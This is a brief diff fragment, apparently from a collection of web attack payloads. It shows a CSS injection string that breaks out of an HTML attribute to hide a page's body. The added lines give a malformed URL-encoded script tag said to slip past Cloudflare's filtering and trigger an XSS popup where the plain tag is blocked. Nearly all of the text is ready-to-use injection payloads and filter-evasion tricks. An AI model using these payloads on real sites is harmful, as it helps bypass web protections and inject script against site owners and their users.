@@ -152,3 +152,8 @@ Bero wala payload DOD
 if you can't find a way to get #xss, why not try css payload:
 
 hi"><style>body{display:none}</style>
+
+
+Bypass cloudflare with incorrect url encoding
+<script>alert()</script> blocked
+%2sscript%2ualert()%2s/script%2u -xss popup
